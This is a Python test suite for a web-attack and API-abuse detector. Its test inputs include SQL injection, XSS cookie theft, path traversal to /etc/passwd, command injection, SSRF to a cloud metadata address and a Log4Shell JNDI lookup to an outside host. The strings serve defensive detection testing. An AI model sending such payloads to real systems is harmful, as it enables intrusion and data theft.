"""API abuse / web-attack requests (cyber-threat module): finding requests in logs, request shape, attack types,
the scan verdict for short pastes vs long logs, and a tiny end-to-end training run. No network, no real model needed."""
import os
import subprocess
import sys

import numpy as np
import pytest

from app.detectors import api_abuse as AA
from app.detectors import cyber_threat as C

BACKEND = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


# ---- finding requests --------------------------------------------------------------------------------------------
def test_raw_request_with_form_body():
    text = ("POST http://localhost:8080/shop/register.jsp HTTP/1.1\nHost: localhost:8080\nContent-Length: 30\n\n"
            "name=Ana&email=ana%40x.com\n\nGET /shop/index.jsp?id=2 HTTP/1.1\nHost: localhost:8080\n\n")
    r = AA.extract_requests(text)
    assert [(x["method"], x["path"], x["query"], x["body"]) for x in r] == [
        ("POST", "/shop/register.jsp", "", "name=Ana&email=ana%40x.com"), ("GET", "/shop/index.jsp", "id=2", "")]


def test_access_log_and_plain_lines():
    log = ('203.0.113.7 - - [21/Oct/2026:10:01:02 +0530] "GET /api/v1/items?id=5 HTTP/1.1" 200 512\n'
           "2026-10-21 10:01 POST /api/login?next=/home\nnothing here\n")
    r = AA.extract_requests(log)
    assert [(x["method"], x["path"], x["query"]) for x in r] == [("GET", "/api/v1/items", "id=5"),
                                                                ("POST", "/api/login", "next=/home")]
    assert AA.extract_requests("2026-10-21 INFO user=ashis action=login") == []


def test_shape_hides_ordinary_words_and_keeps_attack_syntax():
    s = AA.shape("/tienda/anadir.jsp?nombre=Jam%F3n+Ib%E9rico&cantidad=%27%3B+DROP+TABLE+usuarios%3B--")
    assert "drop" in s and "table" in s and "'" in s and ";" in s
    assert "tienda" not in s and "usuarios" not in s and "jam" not in s      # ordinary words -> placeholders
    assert AA.shape("/a?q=%253Cscript%253E") == AA.shape("/a?q=<script>")    # double encoding is undone


@pytest.mark.parametrize("request_text,expected", [
    ("/api/items?id=1' UNION SELECT username,password FROM users--", "SQL injection"),
    ("/login?user=admin' or '1'='1", "SQL injection"),
    ("/search?q=<script>alert(document.cookie)</script>", "Cross-site scripting (XSS)"),
    ("/view?file=../../../../etc/passwd", "Path traversal / sensitive file"),
    ("/ping?host=8.8.8.8;cat /etc/hosts", "Command injection"),
    ("/fetch?url=http://169.254.169.254/latest/meta-data/", "Server-side request forgery (SSRF)"),
    ("/api?x=${jndi:ldap://203.0.113.9/a}", "Log4Shell / template injection"),
])
def test_attack_types(request_text, expected):
    assert expected in [n for n, *_ in AA.attack_types(AA.decode(request_text).lower())]


@pytest.mark.parametrize("request_text", [
    "/search?q=select+a+laptop+from+our+store", "/blog/union-budget-2026", "/api/v1/orders?id=12&sort=desc",
    "/customers?name=O'Brien&city=Cork", "/api?cmd=status&format=json", "/docs/../index.html",
    "/redirect?url=https://www.bput.ac.in/notice", "/forms/feedback?rating=5&comment=great+course"])
def test_ordinary_requests_have_no_attack_type(request_text):
    assert AA.attack_types(AA.decode(request_text).lower()) == []


# ---- scan verdict --------------------------------------------------------------------------------------------
class FakeVec:
    def transform(self, xs):
        return list(xs)


class FakeModel:
    """Probability 0.95 for requests whose shape contains the kept keyword 'localhost' (test marker), else 0.01."""
    def predict_proba(self, xs):
        p = np.array([0.95 if "localhost" in x else 0.01 for x in xs])
        return np.column_stack([1 - p, p])


@pytest.fixture()
def fake_model(monkeypatch):
    bundle = {"kind": AA.BUNDLE_KIND, "version": AA.BUNDLE_VERSION, "vectorizer": FakeVec(), "model": FakeModel(),
              "thr_alert": 0.9, "thr_verify": 0.5, "trained_at": "test"}
    monkeypatch.setattr(AA, "load_model", lambda: bundle)
    return bundle


def line(i, path):
    return f'198.51.100.{i} - - [21/Oct/2026:10:00:{i:02d} +0530] "GET {path} HTTP/1.1" 200 512'


ODD = "/api/v1/items?host=localhost&mode=x"         # model-only "unusual" request (no attack type matches)


def test_short_paste_uses_the_model_level(fake_model):
    r = C.analyze_event_text(line(1, ODD), {}, "API Abuse Detection")
    assert r["riskScore"] >= 71 and "API-abuse model: requests look like web attacks" in \
        [i["label"] for i in r["indicators"] if i["triggered"]]


def test_one_unusual_request_in_a_long_log_is_not_raised_but_two_are(fake_model):
    normal = [line(i, f"/api/v1/items?page={i}") for i in range(20)]
    one = C.analyze_event_text("\n".join(normal + [line(30, ODD)]), {}, "API Abuse Detection")
    assert one["riskScore"] < 51
    two = C.analyze_event_text("\n".join(normal + [line(30, ODD), line(31, ODD)]), {}, "API Abuse Detection")
    assert two["riskScore"] >= 71


def test_attack_pattern_is_an_alert_even_in_a_long_log(fake_model):
    normal = [line(i, f"/api/v1/items?page={i}") for i in range(20)]
    r = C.analyze_event_text("\n".join(normal + [line(40, "/api/items?id=1%27%20UNION%20SELECT%20pass%20FROM%20users--")]),
                             {}, "API Abuse Detection")
    labels = [i["label"] for i in r["indicators"] if i["triggered"]]
    assert r["riskScore"] >= 71 and "Web attack in a request: SQL injection" in labels
    assert r["webRequests"]["requests"] == 21 and r["webRequests"]["attackTypes"] == {"SQL injection": 1}


def test_normal_api_log_is_safe(fake_model):
    r = C.analyze_event_text("\n".join(line(i, f"/api/v1/results?semester=4&roll=21CSE0{i:02d}") for i in range(15)),
                             {}, "API Abuse Detection")
    assert r["riskScore"] < 51


def test_without_a_model_the_attack_patterns_still_work(monkeypatch):
    monkeypatch.setattr(AA, "load_model", lambda: None)
    r = C.analyze_event_text(line(1, "/view?file=../../../../etc/passwd"), {}, "API Abuse Detection")
    assert r["riskScore"] >= 71
    assert C.analyze_event_text(line(1, "/api/v1/items?page=2"), {}, "API Abuse Detection")["riskScore"] < 51


def test_text_without_requests_is_unchanged(fake_model):
    r = C.analyze_event_text("2026-10-20 10:15:02 INFO app=erp user=ashis action=view status=200", {}, "x")
    assert "webRequests" not in r and r["riskScore"] == 0


def test_raw_http_requests_route_to_api_abuse():
    from app.services import subtopic_router as R
    cl = R.classify(module_id="cyber-threat", text_input="GET /shop/item.jsp?id=1 HTTP/1.1\nHost: shop.example\n",
                    url_input=None, file_path=None, file_name=None, extra_field_values={})
    assert cl.subtopic_id == "api-abuse"


# ---- training script (tiny, offline) ---------------------------------------------------------------------------
def _write_fixtures(d):
    rnd = np.random.default_rng(0)
    words = ["casa", "mesa", "rojo", "azul", "producto", "carrito", "nombre", "ciudad"]

    def raw(path, q):
        return f"GET http://localhost:8080{path}?{q} HTTP/1.1\nHost: localhost:8080\nConnection: close\n\n\n"
    normal = "".join(raw(f"/tienda/{rnd.choice(words)}.jsp", f"id={i}&nombre={rnd.choice(words)}") for i in range(300))
    attacks = "".join(raw("/tienda/anadir.jsp", f"id={i}&cantidad=%27%3B+DROP+TABLE+x{i}%3B--" if i % 2 else
                          f"id={i}&q=%3Cscript%3Ealert({i})%3C/script%3E") for i in range(300))
    for name, content in (("csic_normalTrafficTraining.txt", normal), ("csic_normalTrafficTest.txt", normal),
                          ("csic_anomalousTrafficTest.txt", attacks)):
        with open(os.path.join(d, name), "w", encoding="latin-1") as f:
            f.write(content)
    with open(os.path.join(d, "httpparams_payload_full.csv"), "w", encoding="utf-8") as f:
        f.write('"payload","length","attack_type","label"\n')
        for i in range(200):
            f.write(f'"{rnd.choice(words)}{i}","5","norm","norm"\n' if i % 2 else f'"1 or {i}={i}--","9","sqli","anom"\n')
    for name in ("dephides_train.txt", "dephides_val.txt", "dephides_test.txt"):
        with open(os.path.join(d, name), "w", encoding="utf-8") as f:
            for i in range(400):
                f.write(f"legitimate\thttps://site{i % 97}.example/{rnd.choice(words)}/page{i}?ref={rnd.choice(words)}\n")
    with open(os.path.join(d, "fwaf_goodqueries.txt"), "w") as f:
        f.write("\n".join(f"/{rnd.choice(words)}/index.php?page={i}" for i in range(200)))
    with open(os.path.join(d, "fwaf_badqueries.txt"), "w") as f:
        f.write("\n".join(f"/search.php?q=<script>alert({i})</script>" for i in range(200)))


def test_training_script_quick_run(tmp_path):
    data, out = tmp_path / "data", tmp_path / "models"
    data.mkdir()
    _write_fixtures(str(data))
    r = subprocess.run([sys.executable, "-m", "app.ml.training.train_api_abuse", "--data-dir", str(data), "--out", str(out),
                        "--quick", "--allow-unverified"], cwd=BACKEND, capture_output=True, text=True, timeout=600)
    assert r.returncode == 0, r.stdout[-2000:] + r.stderr[-2000:]
    import joblib
    b = joblib.load(out / "api_abuse.joblib")
    assert b["kind"] == AA.BUNDLE_KIND and 0 < b["thr_verify"] <= b["thr_alert"] <= 1
    assert (out / "api_abuse.metrics.json").exists()


def test_training_refuses_files_that_are_not_the_pinned_versions(tmp_path):
    data = tmp_path / "data"
    data.mkdir()
    _write_fixtures(str(data))
    r = subprocess.run([sys.executable, "-m", "app.ml.training.train_api_abuse", "--data-dir", str(data),
                        "--out", str(tmp_path / "m"), "--quick"], cwd=BACKEND, capture_output=True, text=True, timeout=300)
    assert r.returncode != 0 and "SHA-256" in (r.stdout + r.stderr)
